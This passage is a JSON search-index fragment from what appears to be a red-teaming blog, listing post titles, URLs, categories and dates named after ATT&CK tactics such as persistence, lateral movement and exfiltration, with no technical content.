https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" }, { "title": "Reconnaissance", "url": "/posts/reconnaissance/", "categories": "Red Teaming, Reconnaissance", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Recon" }, { "title": "Privilege Escalation", "url": "/posts/privesc/", "categories": "Red Teaming, Privilege Escalation", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Privilege Escalation" }, { "title": "Persistence", "url": "/posts/persist/", "categories": "Red Teaming, Persistence", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Persistence" }, { "title": "Lateral Movement", "url": "/posts/lateral/", "categories": "Red Teaming, Lateral Movement", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Lateral Movement" }, { "title": "Impact", "url": "/posts/impact/", "categories": "Red Teaming, Impact", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Impact" }, { "title": "Exfiltration", "url": "/posts/exfiltration/", "categories": "Red Teaming, Exfiltration", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Exfiltration" }, { "title": "Execution", "url": "/posts/execution/", "categories": "Red Teaming, Execution", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Execution" }, { "title": "Defense Evasion", "url": "/posts/evasion/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Defense Evasion" }, { "title": "Discovery", "url": "/posts/discovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Discovery" }, { "title": "Credential Access", "url": "/posts/credaccess/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Credential Access" }, { "title": "Collection", "url": "/posts/collection/", "categories": "Red Teaming, Collection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Collection" }, { "title": "Command and Control", "url": "/posts/c2/", "categories": "Red Teaming, Command and Control", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Command and Control" } ]
